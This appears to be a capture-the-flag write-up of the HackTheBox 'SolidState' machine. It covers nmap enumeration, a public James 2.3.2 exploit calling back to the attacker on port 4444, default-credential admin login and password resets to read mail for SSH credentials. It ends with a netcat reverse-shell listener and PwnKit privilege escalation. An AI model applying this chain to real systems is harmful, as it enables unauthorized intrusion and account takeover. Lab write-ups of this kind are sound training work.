**Ping** 
```
ping 10.10.10.51
```
![[Pasted image 20240623170746.png]]

Nmap default Scan
```
nmap 10.10.10.51 -oN dnmap
```
![[Pasted image 20240623170844.png]]

Nmap Script and Service Scan
```
nmap 10.10.10.51 -sV -sC -A -oN snmap
```
![[Pasted image 20240623175947.png]]

Nmap All Port Scan
```
nmap 10.10.10.51 -p- --open -T5 -oN anmap
```
![[Pasted image 20240623180106.png]]
We found one extra port

Service enumeration on new port
```
nmap 10.10.10.51 -sV -sC -p4555
```
![[Pasted image 20240623180314.png]]

On port 80
![[Pasted image 20240623180025.png]]



Will Search public Exploit for James server 2.3.2 version
![[Pasted image 20240623181637.png]]
We got some
Will you the exploit db's https://www.exploit-db.com/exploits/50347

I have saved the python script in a file named exp.py as always

Will run the exploit
```
python3 exp.py 10.10.10.51 10.10.14.6 4444
```
![[Pasted image 20240623181753.png]]

So now we have to wait for someone to login via ssh to trigger over payload

Or will try some way to get in
Will try with Administrator tool on port 4555
```
telnet 10.10.10.51 4555
```
![[Pasted image 20240623181913.png]]
have used default creds **root:root**

So we are admin now, Will explore the session
```
HELP
```
![[Pasted image 20240623182006.png]]

Will list the users
```
listusers
```
![[Pasted image 20240623182309.png]]

Will change password for any user of our choice, I'm going to change password for john
```
setpassword john Password1!
```
![[Pasted image 20240623183525.png]]

Will try the new password from pop3
```
telnet 10.10.10.51 110
USER john
PASS Password1!
```
![[Pasted image 20240623183339.png]]
Great we changed password of john successfully....!

John as no emails, so will try to change passwords for other user and look for mails.

Eventually Mindy has mail
```
LIST
```
![[Pasted image 20240623200330.png]]

Will read the content
```
RETR 1
RETR 2
```
![[Pasted image 20240623200448.png]]

We got SSH creds on 2nd email
![[Pasted image 20240623200523.png]]
**mindy:P@55W0rd1!2@**

Will ssh now
```
ssh mindy@10.10.10.51
```
![[Pasted image 20240623201958.png]]
Now will check on our reverse shell

```
rlwrap nc -nvlp 4444
```
![[Pasted image 20240623202048.png]]
Nice....1

**user.txt**
![[Pasted image 20240623202205.png]]

Now will jump to privilege escalation......!


After a long Enumeration there is now way around to get escalate my Privileges

But there is one, PwnKit it is....!

I can see pkexec has SUID , So I have check Pkexec version and it is vulnerable one 
```
find / -perm -u=s -type f 2>/dev/null
```
```
pkexec --version
```
![[Pasted image 20240623205803.png]]

It is 32bit system, so I have transferred Pwnkit32 to the target machine and ran it
```
chmod +x Pwnkit32
./Pwnkit32
```
![[Pasted image 20240623210032.png]]
wE aR3 R0ot....!

**Root.txt**
![[Pasted image 20240623210149.png]]





Done with Solidstate......:)